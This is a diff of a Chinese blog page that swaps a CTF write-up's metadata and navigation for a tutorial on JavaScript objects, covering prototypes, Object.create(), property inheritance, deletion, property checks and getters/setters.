+<h3 id="通过new创建对象"><a href="#通过new创建对象" class="headerlink" title="通过new创建对象"></a>通过new创建对象</h3><p>关键字new后跟随一个函数调用。这里的函数调用。这里的函数称作构造函数(constructor)，构造函数用以初始化一个新创建的对象。JavaScript语言核心中的原始类型都包含内置构造函数</p>
+<h3 id="原型"><a href="#原型" class="headerlink" title="原型"></a>原型</h3><p>所有通过对象直接量创建的对象都具有同一个原型对象，并可以通过JavaScript代码Object.prototype获得对原型对象的引用。通过关键字new和构造函数调用创建的对象的原型就是构造函数的prototype属性的值。通过new Array()创建的对象的原型就是Array.prototype，通过new Date()创建的对象的原型就是Date.prototype。</p>
+<p>没有原型的对象为数不多，Object.prototype就是其中之一。它不继承任何属性。其他原型对象都是普通对象，普通对象都是具有原型。所有的内置构造函数（以及大部分自定的构造函数）都具有一个继承自Object.prototype的原型。</p>
+<h3 id="Object-create"><a href="#Object-create" class="headerlink" title="Object.create()"></a>Object.create()</h3><p>ECMAScript 5定义了一个名为Object.create()的方法，它创建一个新对象，其中第一个参数就是这个对象的原型。Object.create()提供第二个可选参数，用以对对象进行进一步描述。</p>
+<p>Object.create()是一个静态函数（直接调用），而不是提供给某个对象调用的方法。</p>
+<p>可以通过传入参数null来创建要给没有原型的新对象，但通过这种方式创建的对象不会继承任何东西，甚至不包括基础方法，比如toString()。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
+<p>如果想创建要给普通的空对象（比如通过{}或new Object()创建的对象），需要传入Object.prototype：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = <span class="built_in">Object</span>.create(<span class="built_in">Object</span>.prototype);</span><br></pre></td></tr></table></figure>
+<h2 id="属性的查询和设置"><a href="#属性的查询和设置" class="headerlink" title="属性的查询和设置"></a>属性的查询和设置</h2><p>可以通过点(.)或方括号([])运算符来获取属性的值。运算符左侧应当是要给表达式，它返回一个对象。对于点来说，右侧必须是一个属性名称命名的简单标识符。对于方括号来说，方括号内必须是一个计算结果为字符串的表达式。</p>
+<p>如果一个对象的属性名是保留字，则必须使用方括号的形式访问它们。ECMAScript  5放宽了限制，可以在点运算符后直接使用保留字。</p>
+<h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>JavaSc对象具有“自由属性”(own property)，也有一些属性是从原型对象继承而来的。</p>
+<p>假设要查询对象o的属性x，如果o中不存在x，那么将会继续在o的原型对象中查询属性x。如果原型对象中也没有x，但这个原型对象也有原型，那么就继续在这个原型对象的原型上执行查询，知道找到x或者查找到要给原型是null的对象为止。可以看到，对象的原型属性构成了要给“链”，通过这个“链”可以实现属性的继承。</p>
+<p>给对象o的属性x复制，如果o中已经有属性x（这个属性不是继承来的），那么这个复制操作值改变这个已有属性x的值。如果o中不存在属性x，那么赋值操作给o添加要给新属性x。如果之前o继承了属性x，那么这个继承的属性就被新创建的同名属性覆盖了。</p>
+<p>只有在查询属性时才会体会到继承的存在，而设置属性则和继承无关。这是JavaScript的一个重要特性，该特性让程序员可以有选择覆盖继承的属性。</p>
+<p>如果o继承自属性x，而这个属性是要给具有setter方法的accessor属性，那么这时将调用setter方法而不是给o创建要给属性x。需要注意的是setter方法是由对象o调用的，而不是定义这个属性的原型对象调用的。因此如果setter方法定义任何属性，这个操作只是针对o本身，并不修改原型链</p>
+<h3 id="属性访问错误"><a href="#属性访问错误" class="headerlink" title="属性访问错误"></a>属性访问错误</h3><p>查询一个不存在的属性并不会报错，如果在对象o自身的属性或继承的属性中均未找到属性x，属性访问表达式o.x返回undefined。</p>
+<p>如果对象不存在，那么试图查询这个不存在的对象的属性就会报错。</p>
+<p>在ECMAScript 5的严格模式中，任何失败的属性操作都会抛出一个类型错误异常。</p>
+<p><strong>失败的常见例子：</strong></p>
+<ul>
+<li>o中的属性p是只读的：不能给只读属性重新赋值</li>
+<li>o中的属性p是继承属性，且它是只读的：不能通过同名自有属性覆盖只读的继承属性</li>
+<li>o中不存在自有属性p：o没有使用setter方法继承属性p，并且o的可扩展性(extensible attribute)是false。</li>
+</ul>
+<h2 id="删除属性"><a href="#删除属性" class="headerlink" title="删除属性"></a>删除属性</h2><p>delete运算符可以删除对象的属性</p>
+<p>delete运算符只能删除自有属性，不能删除继承属性（要删除继承属性必须从定义这个属性的原型对象上删除上，而且这回影响到所有继承这个原型的对象）</p>
+<p>当delete表达式删除成功或没有任何副作用（比如删除不存在的对象属性）时，它返回true，如果delete后不是一个属性访问表达式，delete同样返回true。</p>
+<p>delete不能删除那些可配置性为false的属性（尽管可以删除不可扩展对象的可配置属性）</p>
+<p>通过变量声明和函数声明创建的全局对象中的属性是不可配置的</p>
+<p>删除一个不可配置属性会报一个类型错误</p>
+<p>当在非严格模式中删除全局对象的可配置属性时，可以省略对全局对象的引用，直接在delete操作符后跟随要删除的属性。</p>
+<h2 id="检测属性"><a href="#检测属性" class="headerlink" title="检测属性"></a>检测属性</h2><p>判断某个属性是否存在于某个对象中。可以通过in运算符、hasOwnPreperty()和propertyIsEnumerable()方法来完成。</p>
+<p>in运算符的左侧是属性名（字符串），右侧是对象。如果对象的自有属性或继承属性中包含这个属性则返回true。</p>
+<p>对象的hasOwnProperty()方法用来检测给定的名字是否是对象的自有属性。对于继承属性它将返回false。</p>
+<p>propertyIsEnumerable()是hasOwnProperty()的增强版，只有检测到是自有属性且这个属性的可枚举性为true时它才返回true。</p>
+<h2 id="属性getter和setter"><a href="#属性getter和setter" class="headerlink" title="属性getter和setter"></a>属性getter和setter</h2><p>在ECMAscript 5中，属性值可以用一个或两个方法来代替，这两个方法就是getter和setter。由getter和setter定义的属性称为“存取器属性”。</p>
+<p>和数据属性不同，存取器属性不具有可写性。如果属性同时具有getter和setter方法，那么它是一个读/写属性。如果它只有getter方法，那么他就是一个只读属性。如果它只有setter方法，那么他就是一个只写属性。</p>
+
       
     </div>
     
@@ -464,13 +452,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/10/28/SECCON-2018-CTF-GhostKingdom-Write-up/">SECCON 2018 CTFGhostKingdom Writeup</a></p>
+        <p><span>本文标题:</span><a href="/2019/03/09/JavaScript对象/">JavaScript对象</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Double--R</a></p>
-        <p><span>发布时间:</span>2018-10-28, 17:38:06</p>
-        <p><span>最后更新:</span>2018-12-15, 21:25:08</p>
+        <p><span>发布时间:</span>2019-03-09, 14:34:59</p>
+        <p><span>最后更新:</span>2019-03-17, 20:33:28</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/10/28/SECCON-2018-CTF-GhostKingdom-Write-up/" title="SECCON 2018 CTFGhostKingdom Writeup">http://yoursite.com/2018/10/28/SECCON-2018-CTF-GhostKingdom-Write-up/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/10/28/SECCON-2018-CTF-GhostKingdom-Write-up/　　作者: Double--R" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/03/09/JavaScript对象/" title="JavaScript对象">http://yoursite.com/2019/03/09/JavaScript对象/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/03/09/JavaScript对象/　　作者: Double--R" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -482,16 +470,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/11/04/AnchorCMS-XSS/">
-                    AnchorCMS0.9.2-XSS漏洞审计
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/10/23/Vulhub-phpmyadmin4-0-x-4-6-2远程代码执行/">
-                    Vulhub-phpmyadmin4.0.x-4.6.2远程代码执行漏洞
+                <a href="/2019/03/06/CSS选择器/">
+                    CSS选择器
                 </a>
             </div>
         
@@ -503,7 +485,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目界面"><span class="toc-number">1.</span> <span class="toc-text">题目界面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解题思路"><span class="toc-number">2.</span> <span class="toc-text">解题思路</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#对象"><span class="toc-number">1.</span> <span class="toc-text">对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#创建对象"><span class="toc-number">2.</span> <span class="toc-text">创建对象</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#对象直接量"><span class="toc-number">2.1.</span> <span class="toc-text">对象直接量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#通过new创建对象"><span class="toc-number">2.2.</span> <span class="toc-text">通过new创建对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#原型"><span class="toc-number">2.3.</span> <span class="toc-text">原型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Object-create"><span class="toc-number">2.4.</span> <span class="toc-text">Object.create()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#属性的查询和设置"><span class="toc-number">3.</span> <span class="toc-text">属性的查询和设置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#继承"><span class="toc-number">3.1.</span> <span class="toc-text">继承</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#属性访问错误"><span class="toc-number">3.2.</span> <span class="toc-text">属性访问错误</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#删除属性"><span class="toc-number">4.</span> <span class="toc-text">删除属性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#检测属性"><span class="toc-number">5.</span> <span class="toc-text">检测属性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#属性getter和setter"><span class="toc-number">6.</span> <span class="toc-text">属性getter和setter</span></a></li></ol>
         
     </div>
     <style>
@@ -539,7 +521,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"SECCON 2018 CTFGhostKingdom Writeup　| DoubleR's BLOG　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"JavaScript对象　| DoubleR's BLOG　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -559,15 +541,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/11/04/AnchorCMS-XSS/" title="上一篇: AnchorCMS0.9.2-XSS漏洞审计">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/10/23/Vulhub-phpmyadmin4-0-x-4-6-2远程代码执行/" title="下一篇: Vulhub-phpmyadmin4.0.x-4.6.2远程代码执行漏洞">
+            <a href="/2019/03/06/CSS选择器/" title="下一篇: CSS选择器">
                 <i class="fa fa-angle-right"></i>
             </a>
         
